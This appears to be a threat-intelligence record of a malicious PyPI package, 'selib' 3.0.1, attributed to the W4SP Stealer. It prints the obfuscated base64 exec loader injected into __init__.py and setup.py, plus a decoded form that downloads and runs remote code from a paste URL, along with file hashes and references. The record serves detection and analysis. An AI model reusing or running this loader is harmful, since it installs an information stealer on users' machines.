PYTHON MALWARE

MALWARE ATTRIBUTION: W4SP STEALER

PACKAGE NAME: selib
VERSION: 3.0.1

INFECTED FILE: ['selib-3.0.1/src/__init__.py', 'selib-3.0.1/setup.py']


INFECTED CODE:
LINE: 2
;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwczovL3BzdC5rbGdydGguaW8vcGFzdGUvaHp6enAvcmF3JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))


DECODED:
from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _eexecutable
from os import system as _ssystem
_ttmp = _ffile(delete=False)
_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://pst.klgrth.io/paste/hzzzp/raw').read())""")
_ttmp.close()
try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
except: pass


PYTHON FILE HASH
FILENAME: __init__.py
md5: 17150A1A43AB850E9775228E3D89E8A1
sha1: 761D1F99199B8F4C9D53EC8EB2E503715390610B
sha256: FB9736F8C52104B187F86F21E3079E1DE4A209B7403BE3497984B971B88F879F

FILENAME: setup.py
md5: DB23EF720772FABAE2BEE761E7374062
sha1: 87A7C72C3E363C17C890F082A40CE15B4AEE36DD
sha256: C5CAF58AA9FBE70866843F97DC275C8B6C90655EA80EC97AF1B7B42A073453E7


DOWNLOAD URLS:
https://pst.klgrth.io/paste/hzzzp/raw


REFERENCES:
https://blog.polyswarm.io/w4sp-infostealer
https://www.bleepingcomputer.com/news/security/hackers-bombard-pypi-platform-with-information-stealing-malware/
